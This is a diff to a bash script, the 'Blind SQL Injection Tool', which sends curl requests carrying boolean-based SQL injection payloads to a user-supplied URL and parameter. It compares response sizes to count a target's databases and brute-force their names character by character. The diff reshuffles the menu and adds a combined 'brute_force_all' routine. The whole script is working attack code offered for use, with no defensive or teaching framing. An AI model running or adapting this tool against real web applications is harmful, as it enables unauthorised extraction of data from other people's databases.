@@ -2,9 +2,9 @@
 
 echo "Welcome to the Blind SQL Injection Tool"
 echo "---------------------------------------"
-echo "1. List database names"
-echo "2. List table names from a specific database"
-echo "3. Brute force database name"
+echo "1. Find the number of databases"
+echo "2. Brute force the database names"
+echo "3. Find the number and brute force the database names"
 echo "Select an option: "
 read -r ACTION
 
@@ -22,24 +22,18 @@ read -r URL
 echo "Enter the parameter to test (e.g., id): "
 read -r PARAMETER
 
-# Function to send requests with SQL injection
 send_request() {
     local query="$1"
     local injection="${PARAMETER}=${query}"
-    local response
-
     if [ "$METHOD" == "POST" ]; then
-        response=$(curl -s -X POST --data "$injection" "$URL" -w "%{size_download}\n" -o /dev/null)
+        curl -s -X POST --data "$injection" "$URL" -w "%{size_download}\n" -o /dev/null
     else
-        response=$(curl -s -G --data-urlencode "$injection" "$URL" -w "%{size_download}\n" -o /dev/null)
+        curl -s -G --data-urlencode "$injection" "$URL" -w "%{size_download}\n" -o /dev/null
     fi
-
-    echo "$response"
 }
 
-# Function to extract the length of the information by response length comparison
 extract_length() {
-    local test_length
+	local test_length
     local length
     local response_lengths=()
     local significant_difference=10
@@ -68,10 +62,8 @@ extract_length() {
     echo "Failed to determine the correct count of databases."
 }
 
-# Function to brute force the database name character by character
-# Function to brute force the database name character by character
-brute_force_db_name() {
-    local db_name=""
+brute_force_db_names() {
+	local db_name=""
     local position=1
     local reference_length=$(send_request "1' and '1'='2" -- -)
     local current_length
@@ -86,7 +78,7 @@ brute_force_db_name() {
             local query="1' or substring(database(),$position,1)='$char' -- -"
             current_length=$(send_request "$query")
 
-            echo "Testing character '$char' at position $position: Response Length - $current_length"
+            #echo "Testing character '$char' at position $position: Response Length - $current_length"
 
             if [[ "$current_length" -ne "$reference_length" ]]; then
                 db_name+="$char"
@@ -106,19 +98,30 @@ brute_force_db_name() {
 
     echo "Database name: $db_name"
 }
-# Main functionality to list databases, tables, or brute force database name
+
+brute_force_all() {
+	
+            local number_of_databases=$(extract_length)
+            echo "Number of databases: $number_of_databases"
+           
+ 	    sleep 2
+
+            brute_force_db_names $(extract_length)
+            
+
+}
+
 list_items() {
     case "$ACTION" in
         1)
-            extract_length
+            local number_of_databases=$(extract_length)
+            echo "Number of databases: $number_of_databases"
             ;;
         2)
-            echo "Enter the database name to list tables: "
-            read -r DATABASE_NAME
-            echo "Functionality to list table names is not implemented in this script."
+            brute_force_db_names $(extract_length)
             ;;
         3)
-            brute_force_db_name
+            brute_force_all
             ;;
         *)
             echo "Invalid option."
